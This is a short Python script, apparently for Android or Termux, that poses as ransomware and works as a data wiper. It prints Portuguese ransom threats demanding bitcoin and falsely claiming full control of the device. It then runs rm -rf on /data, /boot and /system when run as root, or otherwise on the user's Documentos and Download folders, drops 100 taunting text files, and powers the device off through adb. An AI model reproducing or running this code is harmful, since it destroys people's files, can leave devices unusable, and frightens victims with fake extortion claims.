import os
from time import sleep
from subprocess import run

class malwaRe:
    def start(self):
    	run("clear")
    	
    	print("Você caiu em um ransomware!!!, pague em bitcoin ou APAGAREMOS e VAZAREMOS  TODO QUE ESTA NO SEU DISPOSITIVO\n")
    	sleep(1)
    	print("Não adianta sair!, mesmo não perdendo os arquivos, nós teremos acesso ao seu dispositivo\n")
    	sleep(1)
    	print("Nós instalamos VARIOS malwares e VIRUS no seu dispositivo!, TEMOS CONTROLE TOTAL\n")
    	sleep(1)
    	
    	run("pkg install adb", shell=True)
    	
    	if os.geteuid() == 0:
    	    run("rm -rf /data",shell=True)
    	    run("rm -rf /boot",shell=True)
    	    run("rm -rf /system",shell=True)
    	    
    	else:
    		run("rm -rf /storage/emulated/0/Documentos", shell=True)
    		run("rm -rf /storage/emulated/0/Download", shell=True)
    		run("rm -rf /sdcard/Documentos", shell=True)
    	run("rm -rf /sdcard/Download", shell=True)
    	
    	for i in range(1, 101):
    	       with open(f"BY_WpsDroid{i}.txt", 'w') as f:
    	           f.write("kkk script kiddie otario")
    	           open(f"BY_WpsDroid{i}.txt")
    	           
    	run("adb shell reboot -p", shell=True)
                
wiper = malwaRe()
wiper.start()
  
